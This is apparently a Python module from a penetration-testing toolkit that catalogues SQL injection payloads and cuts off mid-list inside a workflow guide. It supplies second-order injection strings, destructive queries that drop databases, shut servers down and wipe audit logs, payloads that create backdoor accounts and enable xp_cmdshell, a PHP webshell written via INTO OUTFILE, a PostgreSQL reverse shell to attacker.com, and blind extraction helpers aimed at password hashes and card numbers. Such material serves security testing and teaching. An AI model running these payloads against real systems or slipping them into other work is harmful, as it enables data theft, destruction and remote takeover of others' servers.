"""
Advanced SQL Injection Techniques Module: Second-Order & Numeric Exploitation

This module provides comprehensive examples, payloads, and utilities for advanced
SQL injection attacks including:

1. Second-Order SQL Injection
   - Scenarios where input is properly escaped on INSERT but later used unsafely
   - Real-world examples (account/password change, profile updates)
   - Exploitation techniques and payload generation

2. Destructive Query Examples
   - Shutdown commands for various DBMS
   - DROP TABLE and data destruction
   - Privilege escalation prerequisites
   
3. Numeric-Only Field Exploitation
   - ASCII and SUBSTRING-based extraction
   - Character-by-character string extraction when quotes are blocked
   - Automated extraction functions

Author: Megido Security Team
Version: 1.0.0
"""

from typing import Dict, List, Tuple, Optional, Any
from enum import Enum
import string


class DBMSType(Enum):
    """Supported Database Management System types"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"


class SecondOrderInjection:
    """
    Second-Order SQL Injection Techniques and Payloads
    
    Second-order SQL injection occurs when:
    1. User input is properly escaped/sanitized during initial storage (INSERT)
    2. The stored data is later retrieved and used in SQL queries WITHOUT proper escaping
    3. The malicious payload is executed during the second query, not the first
    
    Common scenarios:
    - User registration → profile display
    - Account creation → password change
    - Comment posting → comment display with admin features
    - File upload → file listing/management
    """
    
    # Real-world second-order injection scenarios
    SCENARIOS = {
        'user_registration': {
            'description': 'Malicious username is stored during registration, '
                          'then executed when admin views user list',
            'step_1_query': "INSERT INTO users (username, password) VALUES (?, ?)",
            'step_1_payload': "admin'-- ",
            'step_2_query': "SELECT * FROM users WHERE username='admin'-- ' AND status='active'",
            'step_2_result': "The comment (--) causes the rest of the query to be ignored, "
                            "potentially bypassing authentication or revealing all admin accounts",
            'impact': 'Authentication bypass, privilege escalation'
        },
        
        'profile_update': {
            'description': 'Malicious data stored in profile field, '
                          'executed when generating reports',
            'step_1_query': "UPDATE users SET bio=? WHERE user_id=123",
            'step_1_payload': "test' OR '1'='1",
            'step_2_query': "SELECT * FROM users WHERE bio LIKE '%test' OR '1'='1%'",
            'step_2_result': "Injected OR clause modifies the WHERE condition, "
                            "potentially exposing all user records",
            'impact': 'Data exfiltration, unauthorized data access'
        },
        
        'password_change': {
            'description': 'Username from session is used unsafely in password update query',
            'step_1_query': "INSERT INTO users (username) VALUES (?)",
            'step_1_payload': "victim' OR username='admin",
            'step_2_query': "UPDATE users SET password='newpass' WHERE username='victim' OR username='admin'",
            'step_2_result': "Password is changed for both victim and admin accounts",
            'impact': 'Account takeover, privilege escalation'
        },
        
        'comment_moderation': {
            'description': 'Comment content is stored safely but executed when admin '
                          'performs bulk operations',
            'step_1_query': "INSERT INTO comments (content, author) VALUES (?, ?)",
            'step_1_payload': "Great post!'; DELETE FROM comments WHERE '1'='1",
            'step_2_query': "DELETE FROM comments WHERE content='Great post!'; "
                           "DELETE FROM comments WHERE '1'='1' AND moderated=0",
            'step_2_result': "Stacked query deletes all comments in the database",
            'impact': 'Data destruction, denial of service'
        },
        
        'search_history': {
            'description': 'Search terms stored and later used in analytics queries',
            'step_1_query': "INSERT INTO search_log (term, user_id) VALUES (?, ?)",
            'step_1_payload': "') UNION SELECT username,password FROM users--",
            'step_2_query': "SELECT term FROM search_log WHERE term LIKE '%') UNION SELECT username,password FROM users--%'",
            'step_2_result': "UNION attack extracts sensitive data during analytics",
            'impact': 'Credential theft, data breach'
        }
    }
    
    @staticmethod
    def get_second_order_payloads(dbms: DBMSType = DBMSType.MYSQL) -> Dict[str, List[str]]:
        """
        Generate second-order SQL injection payloads for various scenarios.
        
        These payloads are designed to be stored safely in the first query
        but execute maliciously in the second query.
        
        Args:
            dbms: Target database management system
            
        Returns:
            Dictionary of payload categories and their payloads
        """
        payloads = {
            'username_payloads': [
                # Basic SQL injection for username fields
                "admin'--",
                "admin'#",
                "admin'/*",
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'#",
                "' OR 1=1--",
                "admin' OR '1'='1",
                "admin' OR 1=1--",
                
                # UNION-based for username
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT username,password FROM users--",
                
                # Stacked queries (if supported)
                "'; DROP TABLE users--",
                "'; UPDATE users SET role='admin'--",
                "'; INSERT INTO admins SELECT * FROM users--",
            ],
            
            'email_payloads': [
                # Email field second-order
                "test@example.com'--",
                "test@example.com' OR '1'='1",
                "admin@site.com' UNION SELECT password FROM users WHERE username='admin'--",
            ],
            
            'bio_payloads': [
                # Biography/description field second-order
                "I am a user' OR '1'='1",
                "My bio'; DELETE FROM comments--",
                "Description' UNION SELECT table_name FROM information_schema.tables--",
            ],
            
            'search_term_payloads': [
                # Search history exploitation
                "search') UNION SELECT username,password FROM users--",
                "term' AND 1=0 UNION SELECT NULL,concat(username,':',password) FROM users--",
            ],
            
            'filename_payloads': [
                # File upload/management second-order
                "file.txt'; DROP TABLE files--",
                "document.pdf' UNION SELECT password FROM users WHERE username='admin'--",
            ]
        }
        
        # Add DBMS-specific payloads
        if dbms == DBMSType.MSSQL:
            payloads['mssql_specific'] = [
                "'; EXEC xp_cmdshell('whoami')--",
                "'; EXEC sp_configure 'show advanced options',1--",
                "admin'; WAITFOR DELAY '00:00:05'--",
            ]
        elif dbms == DBMSType.POSTGRESQL:
            payloads['postgresql_specific'] = [
                "'; COPY users TO '/tmp/users.txt'--",
                "'; CREATE TABLE admins AS SELECT * FROM users--",
            ]
        elif dbms == DBMSType.MYSQL:
            payloads['mysql_specific'] = [
                "'; SELECT * INTO OUTFILE '/tmp/users.txt' FROM users--",
                "admin' UNION SELECT load_file('/etc/passwd')--",
            ]
        
        return payloads
    
    @staticmethod
    def generate_second_order_test_vectors() -> List[Dict[str, str]]:
        """
        Generate comprehensive test vectors for second-order SQL injection testing.
        
        Each test vector includes:
        - Initial payload (stored safely)
        - Expected vulnerable query pattern
        - Expected exploitation result
        
        Returns:
            List of test vector dictionaries
        """
        return [
            {
                'name': 'Username Authentication Bypass',
                'initial_payload': "admin'--",
                'storage_query': "INSERT INTO users (username, password) VALUES (?, ?)",
                'vulnerable_query': "SELECT * FROM users WHERE username='admin'--' AND password=?",
                'exploitation': "Comment removes password check, logs in as admin",
                'severity': 'CRITICAL'
            },
            {
                'name': 'Profile Bio Data Exfiltration',
                'initial_payload': "' UNION SELECT username,password FROM users--",
                'storage_query': "UPDATE profiles SET bio=? WHERE user_id=?",
                'vulnerable_query': "SELECT bio FROM profiles WHERE bio LIKE '%' UNION SELECT username,password FROM users--%'",
                'exploitation': "UNION extracts all credentials when searching profiles",
                'severity': 'CRITICAL'
            },
            {
                'name': 'Email Privilege Escalation',
                'initial_payload': "test@test.com'; UPDATE users SET role='admin' WHERE '1'='1",
                'storage_query': "INSERT INTO users (email) VALUES (?)",
                'vulnerable_query': "SELECT * FROM users WHERE email='test@test.com'; UPDATE users SET role='admin' WHERE '1'='1'",
                'exploitation': "Stacked query elevates all users to admin role",
                'severity': 'CRITICAL'
            },
            {
                'name': 'Comment Content Deletion',
                'initial_payload': "'; DELETE FROM comments--",
                'storage_query': "INSERT INTO comments (content) VALUES (?)",
                'vulnerable_query': "DELETE FROM spam_comments WHERE content=''; DELETE FROM comments--'",
                'exploitation': "Deletes all comments in database",
                'severity': 'HIGH'
            },
            {
                'name': 'Search History Data Leak',
                'initial_payload': "term') UNION SELECT creditcard FROM payments--",
                'storage_query': "INSERT INTO searches (term) VALUES (?)",
                'vulnerable_query': "SELECT term FROM searches WHERE term LIKE '%term') UNION SELECT creditcard FROM payments--%'",
                'exploitation': "Extracts payment data through search analytics",
                'severity': 'CRITICAL'
            }
        ]


class DestructiveQueries:
    """
    Destructive SQL Query Examples for High-Privilege Attack Scenarios
    
    WARNING: These queries are DESTRUCTIVE and should only be used in authorized
    penetration testing environments. They require elevated database privileges
    (DBA, sysadmin, or root) to execute successfully.
    
    Use cases:
    - Post-exploitation after gaining DBA access
    - Demonstrating impact of SQL injection with high privileges
    - Authorized security testing and validation
    """
    
    @staticmethod
    def get_destructive_payloads(dbms: DBMSType) -> Dict[str, List[Dict[str, str]]]:
        """
        Get destructive query payloads for various DBMS platforms.
        
        Each payload includes:
        - The SQL query/command
        - Description of the action
        - Required privileges
        - Impact assessment
        
        Args:
            dbms: Target database management system
            
        Returns:
            Dictionary of destructive payload categories
        """
        if dbms == DBMSType.MYSQL:
            return {
                'shutdown': [
                    {
                        'payload': "'; SHUTDOWN--",
                        'description': 'Attempts to shut down MySQL server',
                        'privileges': 'SHUTDOWN privilege required',
                        'impact': 'Complete database service denial'
                    }
                ],
                'drop_database': [
                    {
                        'payload': "'; DROP DATABASE app_database--",
                        'description': 'Drops entire database',
                        'privileges': 'DROP privilege on database',
                        'impact': 'Complete data loss for application'
                    },
                    {
                        'payload': "'; DROP DATABASE IF EXISTS app_database--",
                        'description': 'Safely drops database if exists',
                        'privileges': 'DROP privilege',
                        'impact': 'Complete data loss'
                    }
                ],
                'drop_tables': [
                    {
                        'payload': "'; DROP TABLE users--",
                        'description': 'Drops users table',
                        'privileges': 'DROP privilege on table',
                        'impact': 'Loss of all user accounts'
                    },
                    {
                        'payload': "'; DROP TABLE users,orders,products--",
                        'description': 'Drops multiple critical tables',
                        'privileges': 'DROP privilege',
                        'impact': 'Complete application data loss'
                    }
                ],
                'truncate_tables': [
                    {
                        'payload': "'; TRUNCATE TABLE users--",
                        'description': 'Removes all data from users table',
                        'privileges': 'DROP privilege (TRUNCATE requires DROP)',
                        'impact': 'All user data deleted, structure remains'
                    },
                    {
                        'payload': "'; TRUNCATE TABLE audit_log--",
                        'description': 'Deletes all audit trail',
                        'privileges': 'DROP privilege',
                        'impact': 'Evidence destruction, no audit trail'
                    }
                ],
                'user_manipulation': [
                    {
                        'payload': "'; DROP USER 'admin'@'localhost'--",
                        'description': 'Drops admin database user',
                        'privileges': 'CREATE USER privilege',
                        'impact': 'Denial of service for admin operations'
                    },
                    {
                        'payload': "'; CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password'--",
                        'description': 'Creates backdoor user account',
                        'privileges': 'CREATE USER privilege',
                        'impact': 'Persistent database access'
                    },
                    {
                        'payload': "'; GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%'--",
                        'description': 'Grants full privileges to backdoor user',
                        'privileges': 'GRANT OPTION privilege',
                        'impact': 'Full database control'
                    }
                ],
                'file_operations': [
                    {
                        'payload': "'; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
                        'description': 'Writes PHP webshell to document root',
                        'privileges': 'FILE privilege, secure_file_priv disabled',
                        'impact': 'Remote code execution on web server'
                    },
                    {
                        'payload': "'; SELECT * FROM users INTO OUTFILE '/tmp/users_dump.txt'--",
                        'description': 'Exports user data to file',
                        'privileges': 'FILE privilege',
                        'impact': 'Data exfiltration'
                    }
                ]
            }
        
        elif dbms == DBMSType.MSSQL:
            return {
                'shutdown': [
                    {
                        'payload': "'; SHUTDOWN WITH NOWAIT--",
                        'description': 'Immediately shuts down SQL Server',
                        'privileges': 'sysadmin role or SHUTDOWN permission',
                        'impact': 'Complete database service denial'
                    },
                    {
                        'payload': "'; SHUTDOWN--",
                        'description': 'Graceful SQL Server shutdown',
                        'privileges': 'sysadmin role',
                        'impact': 'Database service interruption'
                    }
                ],
                'drop_database': [
                    {
                        'payload': "'; DROP DATABASE app_database--",
                        'description': 'Drops database',
                        'privileges': 'db_owner or sysadmin',
                        'impact': 'Complete data loss'
                    }
                ],
                'drop_tables': [
                    {
                        'payload': "'; DROP TABLE dbo.users--",
                        'description': 'Drops users table',
                        'privileges': 'db_ddladmin or db_owner',
                        'impact': 'User data loss'
                    }
                ],
                'command_execution': [
                    {
                        'payload': "'; EXEC xp_cmdshell 'net user backdoor password /add'--",
                        'description': 'Creates Windows user account',
                        'privileges': 'sysadmin role, xp_cmdshell enabled',
                        'impact': 'Operating system compromise'
                    },
                    {
                        'payload': "'; EXEC xp_cmdshell 'net localgroup administrators backdoor /add'--",
                        'description': 'Adds user to administrators group',
                        'privileges': 'sysadmin role',
                        'impact': 'Full system control'
                    },
                    {
                        'payload': "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--",
                        'description': 'Enables xp_cmdshell',
                        'privileges': 'sysadmin role',
                        'impact': 'Enables command execution'
                    }
                ],
                'linked_server_attacks': [
                    {
                        'payload': "'; EXEC ('DROP DATABASE critical_db') AT [LinkedServer]--",
                        'description': 'Drops database on linked server',
                        'privileges': 'Linked server access with DROP permission',
                        'impact': 'Data loss on remote server'
                    }
                ]
            }
        
        elif dbms == DBMSType.POSTGRESQL:
            return {
                'shutdown': [
                    {
                        'payload': "'; SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE pid <> pg_backend_pid()--",
                        'description': 'Terminates all other database connections',
                        'privileges': 'Superuser or pg_signal_backend role',
                        'impact': 'Denial of service'
                    }
                ],
                'drop_database': [
                    {
                        'payload': "'; DROP DATABASE app_database--",
                        'description': 'Drops database',
                        'privileges': 'Database owner or superuser',
                        'impact': 'Complete data loss'
                    }
                ],
                'drop_tables': [
                    {
                        'payload': "'; DROP TABLE users CASCADE--",
                        'description': 'Drops table and all dependent objects',
                        'privileges': 'Table owner or superuser',
                        'impact': 'Data and relationship loss'
                    }
                ],
                'command_execution': [
                    {
                        'payload': "'; COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"'--",
                        'description': 'Executes reverse shell',
                        'privileges': 'Superuser or pg_execute_server_program role',
                        'impact': 'Remote code execution'
                    },
                    {
                        'payload': "'; CREATE OR REPLACE FUNCTION exec(text) RETURNS text AS $$ BEGIN RETURN system($1); END; $$ LANGUAGE plpythonu--",
                        'description': 'Creates command execution function',
                        'privileges': 'Superuser, plpythonu enabled',
                        'impact': 'Persistent command execution capability'
                    }
                ],
                'file_operations': [
                    {
                        'payload': "'; COPY users TO '/tmp/users.csv' DELIMITER ',' CSV HEADER--",
                        'description': 'Exports user data',
                        'privileges': 'pg_read_server_files or superuser',
                        'impact': 'Data exfiltration'
                    }
                ]
            }
        
        elif dbms == DBMSType.ORACLE:
            return {
                'shutdown': [
                    {
                        'payload': "'; SHUTDOWN IMMEDIATE--",
                        'description': 'Immediate database shutdown',
                        'privileges': 'SYSDBA privilege',
                        'impact': 'Complete database service denial'
                    }
                ],
                'drop_tables': [
                    {
                        'payload': "'; DROP TABLE users CASCADE CONSTRAINTS--",
                        'description': 'Drops table with all constraints',
                        'privileges': 'DROP ANY TABLE privilege',
                        'impact': 'Data and integrity loss'
                    }
                ],
                'user_manipulation': [
                    {
                        'payload': "'; ALTER USER system IDENTIFIED BY newpassword--",
                        'description': 'Changes system user password',
                        'privileges': 'ALTER USER privilege',
                        'impact': 'Account takeover'
                    },
                    {
                        'payload': "'; GRANT DBA TO backdoor_user--",
                        'description': 'Grants DBA role',
                        'privileges': 'GRANT ANY ROLE privilege',
                        'impact': 'Full database control'
                    }
                ]
            }
        
        return {}
    
    @staticmethod
    def get_privilege_escalation_payloads(dbms: DBMSType) -> List[Dict[str, str]]:
        """
        Get SQL payloads specifically for privilege escalation after initial compromise.
        
        These payloads attempt to escalate from low privileges to DBA/admin level,
        which then enables destructive operations.
        
        Args:
            dbms: Target database management system
            
        Returns:
            List of privilege escalation payload dictionaries
        """
        if dbms == DBMSType.MYSQL:
            return [
                {
                    'technique': 'UDF Library Injection',
                    'payload': "'; SELECT * FROM mysql.func INTO OUTFILE '/usr/lib/mysql/plugin/udf.so'--",
                    'description': 'Attempts to write malicious UDF library',
                    'prerequisites': 'FILE privilege, plugin_dir writable'
                },
                {
                    'technique': 'MySQL User Privilege Grant',
                    'payload': "'; UPDATE mysql.user SET Grant_priv='Y', Super_priv='Y' WHERE User='current_user'--",
                    'description': 'Modifies user privileges directly in mysql.user table',
                    'prerequisites': 'UPDATE privilege on mysql.user (rarely available)'
                }
            ]
        
        elif dbms == DBMSType.MSSQL:
            return [
                {
                    'technique': 'sp_addsrvrolemember',
                    'payload': "'; EXEC sp_addsrvrolemember 'current_user', 'sysadmin'--",
                    'description': 'Adds current user to sysadmin server role',
                    'prerequisites': 'Member of securityadmin role'
                },
                {
                    'technique': 'Impersonation',
                    'payload': "'; EXECUTE AS LOGIN = 'sa'; EXEC sp_addsrvrolemember 'lowpriv_user', 'sysadmin'; REVERT--",
                    'description': 'Impersonates sa user to grant sysadmin',
                    'prerequisites': 'IMPERSONATE permission on sa'
                }
            ]
        
        elif dbms == DBMSType.POSTGRESQL:
            return [
                {
                    'technique': 'ALTER USER',
                    'payload': "'; ALTER USER current_user WITH SUPERUSER--",
                    'description': 'Grants superuser privilege',
                    'prerequisites': 'ALTER USER privilege (rare)'
                }
            ]
        
        return []


class NumericExploitation:
    """
    Numeric-Only Field SQL Injection Exploitation Techniques
    
    When single quotes are filtered/blocked and only numeric input is expected,
    attackers can still extract string data using:
    - ASCII() function to get character codes
    - SUBSTRING() to extract individual characters
    - Comparison operators to perform binary search
    - Boolean-based blind techniques
    
    This class provides utilities for character-by-character data extraction
    when traditional string-based injection is not possible.
    """
    
    @staticmethod
    def generate_ascii_extraction_payload(
        dbms: DBMSType,
        table: str,
        column: str,
        position: int,
        where_clause: str = "1=1"
    ) -> str:
        """
        Generate payload to extract ASCII value of a character at specific position.
        
        Example scenario:
            Vulnerable query: SELECT * FROM users WHERE id=<USER_INPUT>
            We want to extract: username from first row
            
        Args:
            dbms: Target database system
            table: Table name to extract from
            column: Column name to extract
            position: Character position (1-indexed)
            where_clause: WHERE clause to specify target row
            
        Returns:
            SQL payload for numeric injection
            
        Example:
            >>> NumericExploitation.generate_ascii_extraction_payload(
            ...     DBMSType.MYSQL, 'users', 'username', 1, 'id=1'
            ... )
            '1 AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97'
        """
        if dbms == DBMSType.MYSQL:
            return (f"1 AND ASCII(SUBSTRING((SELECT {column} FROM {table} "
                   f"WHERE {where_clause} LIMIT 1),{position},1))={{ASCII_VALUE}}")
        
        elif dbms == DBMSType.POSTGRESQL:
            return (f"1 AND ASCII(SUBSTRING((SELECT {column} FROM {table} "
                   f"WHERE {where_clause} LIMIT 1),{position},1))={{ASCII_VALUE}}")
        
        elif dbms == DBMSType.MSSQL:
            return (f"1 AND ASCII(SUBSTRING((SELECT TOP 1 {column} FROM {table} "
                   f"WHERE {where_clause}),{position},1))={{ASCII_VALUE}}")
        
        elif dbms == DBMSType.ORACLE:
            return (f"1 AND ASCII(SUBSTR((SELECT {column} FROM {table} "
                   f"WHERE {where_clause} AND ROWNUM=1),{position},1))={{ASCII_VALUE}}")
        
        elif dbms == DBMSType.SQLITE:
            return (f"1 AND UNICODE(SUBSTR((SELECT {column} FROM {table} "
                   f"WHERE {where_clause} LIMIT 1),{position},1))={{ASCII_VALUE}}")
        
        return ""
    
    @staticmethod
    def generate_length_extraction_payload(
        dbms: DBMSType,
        table: str,
        column: str,
        where_clause: str = "1=1"
    ) -> str:
        """
        Generate payload to extract the length of a string value.
        
        This is the first step in extraction - determine how many characters to extract.
        
        Args:
            dbms: Target database system
            table: Table name
            column: Column name
            where_clause: WHERE clause for target row
            
        Returns:
            SQL payload to test string length
            
        Example:
            >>> NumericExploitation.generate_length_extraction_payload(
            ...     DBMSType.MYSQL, 'users', 'password', 'id=1'
            ... )
            '1 AND LENGTH((SELECT password FROM users WHERE id=1 LIMIT 1))={LENGTH_VALUE}'
        """
        if dbms in [DBMSType.MYSQL, DBMSType.POSTGRESQL, DBMSType.SQLITE]:
            return (f"1 AND LENGTH((SELECT {column} FROM {table} "
                   f"WHERE {where_clause} LIMIT 1))={{LENGTH_VALUE}}")
        
        elif dbms == DBMSType.MSSQL:
            return (f"1 AND LEN((SELECT TOP 1 {column} FROM {table} "
                   f"WHERE {where_clause}))={{LENGTH_VALUE}}")
        
        elif dbms == DBMSType.ORACLE:
            return (f"1 AND LENGTH((SELECT {column} FROM {table} "
                   f"WHERE {where_clause} AND ROWNUM=1))={{LENGTH_VALUE}}")
        
        return ""
    
    @staticmethod
    def generate_comparison_payloads(
        dbms: DBMSType,
        table: str,
        column: str,
        position: int,
        where_clause: str = "1=1"
    ) -> Dict[str, str]:
        """
        Generate comparison-based payloads for binary search extraction.
        
        Instead of testing all ASCII values (32-126), binary search is more efficient:
        - Test if ASCII > 64 (if yes, search 65-126; if no, search 32-64)
        - Continue halving the search space
        - Requires only ~7 requests per character instead of ~95
        
        Args:
            dbms: Target database system
            table: Table name
            column: Column name
            position: Character position
            where_clause: WHERE clause
            
        Returns:
            Dictionary with comparison operators and their payloads
        """
        base_payload = NumericExploitation.generate_ascii_extraction_payload(
            dbms, table, column, position, where_clause
        ).replace("={ASCII_VALUE}", "")
        
        return {
            'greater_than': base_payload + ">{VALUE}",
            'less_than': base_payload + "<{VALUE}",
            'equals': base_payload + "={VALUE}",
            'greater_equal': base_payload + ">={VALUE}",
            'less_equal': base_payload + "<={VALUE}",
        }
    
    @staticmethod
    def binary_search_ascii(
        test_function,
        min_val: int = 32,
        max_val: int = 126
    ) -> Optional[int]:
        """
        Perform binary search to find ASCII value efficiently.
        
        This is a helper function for automated extraction. The test_function
        should return True if the actual ASCII value is greater than the test value.
        
        Args:
            test_function: Function that takes an int and returns bool
                          (True if actual value > test value)
            min_val: Minimum ASCII value to search (default: 32, space)
            max_val: Maximum ASCII value to search (default: 126, ~)
            
        Returns:
            The discovered ASCII value, or None if not found
            
        Example:
            >>> def test(val):
            ...     return ord('A') > val  # Actual character is 'A' (65)
            >>> NumericExploitation.binary_search_ascii(test)
            65
        """
        original_min = min_val
        original_max = max_val
        
        while min_val <= max_val:
            mid = (min_val + max_val) // 2
            
            try:
                result = test_function(mid)
                if result:  # Actual value > mid
                    min_val = mid + 1
                else:  # Actual value <= mid
                    max_val = mid - 1
            except Exception:
                return None
        
        # Verify result is within original search range
        if original_min <= min_val <= original_max:
            return min_val
        return None
    
    @staticmethod
    def get_numeric_exploitation_examples() -> List[Dict[str, str]]:
        """
        Get comprehensive examples of numeric field exploitation.
        
        Returns:
            List of exploitation scenario dictionaries with examples
        """
        return [
            {
                'scenario': 'User ID Parameter - Extract Username',
                'vulnerable_code': "SELECT * FROM users WHERE id=<USER_INPUT>",
                'target_data': 'username of user with id=1',
                'step_1': {
                    'description': 'Determine username length',
                    'payload': '1 AND LENGTH((SELECT username FROM users WHERE id=1))=5',
                    'explanation': 'Test different lengths until query returns results'
                },
                'step_2': {
                    'description': 'Extract first character',
                    'payload': '1 AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97',
                    'explanation': 'Character "a" has ASCII value 97'
                },
                'step_3': {
                    'description': 'Extract second character',
                    'payload': '1 AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),2,1))=100',
                    'explanation': 'Character "d" has ASCII value 100'
                },
                'result': 'Repeat for all characters to reconstruct: "admin"',
                'optimization': 'Use binary search to reduce requests from ~95 to ~7 per character'
            },
            {
                'scenario': 'Product ID - Extract Admin Password Hash',
                'vulnerable_code': "SELECT * FROM products WHERE id=<PRODUCT_ID>",
                'target_data': 'password hash from admin account',
                'step_1': {
                    'description': 'Verify admin exists and get password length',
                    'payload': '1 AND (SELECT COUNT(*) FROM users WHERE username=CHAR(97,100,109,105,110))=1',
                    'explanation': 'CHAR(97,100,109,105,110) = "admin" without quotes'
                },
                'step_2': {
                    'description': 'Get password hash length',
                    'payload': '1 AND LENGTH((SELECT password FROM users WHERE username=CHAR(97,100,109,105,110)))=32',
                    'explanation': 'MD5 hashes are 32 characters'
                },
                'step_3': {
                    'description': 'Extract hash character by character',
                    'payload': '1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username=CHAR(97,100,109,105,110)),1,1))>96',
                    'explanation': 'Binary search: if true, char is in range 97-126'
                },
                'result': 'Full MD5 hash extracted: "5f4dcc3b5aa765d61d8327deb882cf99"',
                'notes': 'Can then crack the hash offline'
            },
            {
                'scenario': 'Order ID - Extract Credit Card Data',
                'vulnerable_code': "SELECT * FROM orders WHERE order_id=<ORDER_ID>",
                'target_data': 'credit card number from payments table',
                'step_1': {
                    'description': 'Test if credit card exists for order',
                    'payload': '1 AND (SELECT COUNT(*) FROM payments WHERE order_id=1)>0',
                    'explanation': 'Verify payment record exists'
                },
                'step_2': {
                    'description': 'Extract credit card digits (no quotes needed)',
                    'payload': '1 AND ASCII(SUBSTRING((SELECT cc_number FROM payments WHERE order_id=1),1,1))=52',
                    'explanation': 'First digit "4" = ASCII 52 (Visa card)'
                },
                'step_3': {
                    'description': 'Continue extracting all 16 digits',
                    'payload': 'Repeat for positions 2-16',
                    'explanation': 'Each digit extracted via ASCII comparison'
                },
                'result': 'Full credit card number: "4532015112830366"',
                'impact': 'CRITICAL - Financial fraud, PCI DSS violation'
            }
        ]
    
    @staticmethod
    def generate_test_payload_list(dbms: DBMSType) -> List[str]:
        """
        Generate ready-to-use test payloads for numeric field exploitation.
        
        These payloads test common scenarios and can be used directly in
        automated testing tools or manual penetration testing.
        
        Args:
            dbms: Target database system
            
        Returns:
            List of test payloads
        """
        payloads = [
            # Basic numeric injection tests
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND '1'='1",  # Should fail if properly filtered
            "1 OR 1=1",
            "1 AND 0",
            
            # Length extraction tests (assuming users table, username column)
            "1 AND LENGTH((SELECT username FROM users LIMIT 1))>0",
            "1 AND LENGTH((SELECT username FROM users LIMIT 1))>5",
            "1 AND LENGTH((SELECT username FROM users LIMIT 1))>10",
            
            # ASCII extraction tests (first character)
            "1 AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>64",
            "1 AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>96",
            "1 AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=97",
            
            # Version extraction
            "1 AND ASCII(SUBSTRING(@@version,1,1))>0",
            
            # Database name extraction
            "1 AND LENGTH(database())>0",
            "1 AND ASCII(SUBSTRING(database(),1,1))>0",
        ]
        
        # Add DBMS-specific payloads
        if dbms == DBMSType.MYSQL:
            payloads.extend([
                "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0",
                "1 AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>0",
                "1 AND ASCII(SUBSTRING(user(),1,1))>0",
            ])
        elif dbms == DBMSType.POSTGRESQL:
            payloads.extend([
                "1 AND (SELECT COUNT(*) FROM pg_tables)>0",
                "1 AND ASCII(SUBSTRING((SELECT tablename FROM pg_tables LIMIT 1),1,1))>0",
                "1 AND ASCII(SUBSTRING(current_user,1,1))>0",
            ])
        elif dbms == DBMSType.MSSQL:
            payloads.extend([
                "1 AND (SELECT COUNT(*) FROM sys.tables)>0",
                "1 AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))>0",
                "1 AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>0",
            ])
        
        return payloads


class ExploitationWorkflow:
    """
    Complete exploitation workflows and step-by-step guides.
    
    This class provides end-to-end exploitation scenarios that combine
    multiple techniques for realistic attack simulations.
    """
    
    @staticmethod
    def get_second_order_workflow() -> Dict[str, Any]:
        """
        Get complete workflow for exploiting second-order SQL injection.
        
        Returns:
            Dictionary containing step-by-step exploitation guide
        """
        return {
            'title': 'Second-Order SQL Injection Exploitation Workflow',
            'overview': 'Complete guide from reconnaissance to exploitation',
            'steps': [
                {
                    'phase': '1. Reconnaissance',
                    'actions': [
                        'Identify input points that store data (registration, profile update)',
                        'Map data flow: where is stored data later used?',
                        'Identify potential second-order triggers (login, search, admin panels)',
                        'Check if stored data is used in dynamic SQL queries'
                    ],
                    'tools': ['Browser DevTools', 'Burp Suite', 'SQL Map with --second-order']
                },
                {
                    'phase': '2. Initial Injection',
                    'actions': [
                        'Submit test payload in storage point: username = "test\'--"',
                        'Verify payload is stored (check database or app behavior)',
                        'Confirm no immediate SQL error (indicates proper escaping on INSERT)'
                    ],
                    'example_payload': "admin'--"
                },
                {
                    'phase': '3. Trigger Exploitation',
                    'actions': [
                        'Trigger second query that uses stored data',
                        'Monitor application behavior for SQL errors',
                        'Look for authentication bypass, data leakage, or errors',
                        'Confirm exploitation successful'
                    ],
                    'indicators': [
                        'Different response (login success, data exposure)',
                        'SQL error messages in second request',
                        'Timing differences indicating execution'
                    ]
                },
                {
                    'phase': '4. Exploitation',
                    'actions': [
                        'Refine payload for desired action',
                        'Extract data using UNION or boolean-based techniques',
                        'Escalate privileges if possible',
                        'Establish persistence (backdoor account)'
                    ],
                    'example_payloads': [
                        "' UNION SELECT username,password FROM users--",
                        "'; UPDATE users SET role='admin' WHERE username='attacker'--"
                    ]
                },
                {
                    'phase': '5. Post-Exploitation',
                    'actions': [
                        'Document vulnerability and impact',
                        'Clean up test accounts/data',
                        'Report findings with reproduction steps'
                    ]
                }
            ],
            'best_practices': [
                'Always test in authorized environments only',
                'Document all steps for reproducibility',
                'Clean up any test data created',
                'Never exfiltrate real user data',
                'Follow responsible disclosure guidelines'
            ]
        }
    
    @staticmethod
    def get_numeric_extraction_workflow() -> Dict[str, Any]:
        """
        Get complete workflow for numeric-only field exploitation.
        
        Returns:
            Dictionary containing step-by-step guide
        """
        return {
            'title': 'Numeric Field SQL Injection Exploitation Workflow',
            'overview': 'Extract string data through numeric-only injection point',
            'requirements': [
                'Numeric parameter (id, product_id, order_id)',
                'Boolean-based injection possible (1 AND 1=1 vs 1 AND 1=2)',
                'ASCII/SUBSTRING functions not filtered'
            ],
            'steps': [
                {
                    'phase': '1. Identify Numeric Injection Point',
                    'test_payloads': [
                        '1 AND 1=1  (should work - true condition)',
                        '1 AND 1=2  (should fail - false condition)',
                        "1' AND '1'='1  (should fail if quotes filtered)"
